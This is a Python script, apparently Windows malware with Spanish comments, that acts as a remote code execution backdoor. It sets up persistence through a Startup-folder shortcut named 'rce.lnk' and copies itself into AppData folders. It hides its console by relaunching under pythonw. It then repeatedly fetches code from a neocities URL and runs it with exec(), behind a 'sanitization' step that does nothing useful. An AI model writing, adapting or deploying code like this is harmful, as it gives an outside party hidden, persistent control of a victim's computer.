import os
import sys
import time
import subprocess
import shutil
import requests
import threading
import psutil
import win32com.client

def main():
    # Ejecutar el script en segundo plano sin mostrar la terminal
    run_with_pythonw()

    # Obtener el código de code.html
    code = fetch_code()

    if code:
        # Ejecutar el contenido de code.html 
        run_in_visible_terminal(code)
    else:
        print("No se pudo obtener el contenido de code.html.")

def run_in_visible_terminal(code):
    """Ejecuta el código de code.html en una terminal visible"""
    if sys.platform == "win32":

        subprocess.Popen(['start', 'cmd', '/k', f'echo {code} & pause'], shell=True)
    else:
        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'echo "{code}" && read -p "Press Enter to exit..."'])

# Path 
URL_CODE = "https://rsc-site.neocities.org/code.html"


COPY_FOLDERS = [
    os.path.join(os.getenv('APPDATA'), 'Folder1'),
    os.path.join(os.getenv('APPDATA'), 'Folder2'),
    os.path.join(os.getenv('APPDATA'), 'Folder3')
]


previous_code = ""

#(1 = visible, 0 = hidden)
visibility = 1 

def fetch_code():
    """Obtiene el contenido de code.html desde la URL"""
    try:
        response = requests.get(URL_CODE)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except Exception as e:
        return None

def execute_code(code):
    try:
        sanitized_code = code.replace('&', '').replace('|', '').replace('&&', '').replace('||', '')
        exec(sanitized_code)  
    except Exception as e:
        pass

def run_check():
    global previous_code
    while True:
        try:
            current_code = fetch_code()
            if current_code:
                if current_code != previous_code:
                    previous_code = current_code
                    execute_code(current_code)
                else:
                    pass
            else:
                pass
            time.sleep(0.05)
        except Exception as e:
            time.sleep(0.05)  

def is_running_in_background():
    current_pid = os.getpid()
    for process in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if process.info['pid'] != current_pid:
                cmdline = process.info.get('cmdline')
                if cmdline and __file__ in cmdline:
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def add_to_startup():
    """Add the script to startup"""
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_folder, 'rce.lnk')

    if os.path.exists(shortcut_path):
        return

    try:
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.save()
    except Exception as e:
        pass

def create_copy_in_folders():
    script_path = os.path.abspath(__file__)
    for folder in COPY_FOLDERS:
        try:
            if not os.path.exists(folder):
                os.makedirs(folder)
            copy_path = os.path.join(folder, os.path.basename(script_path))
            if not os.path.exists(copy_path):
                shutil.copy(script_path, copy_path)
        except PermissionError:
            pass

def run_with_pythonw():
    """Ejecuta el script en segundo plano sin mostrar la terminal"""
    if sys.platform == "win32" and "python.exe" in sys.executable:
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw_path, os.path.abspath(__file__)])  # Ejecuta sin ventana de consola

def execute_rce_in_background():
    """Execute the RCE if the script is not running"""
    if not is_running_in_background():
        create_copy_in_folders()
        run_check()  #check loop
    else:
        pass

def set_visibility():
    """Set the visibility of the script"""
    if visibility == 0:
        run_with_pythonw()
    else:
        execute_rce_in_background()

if __name__ == "__main__":
    add_to_startup() 
    set_visibility()  
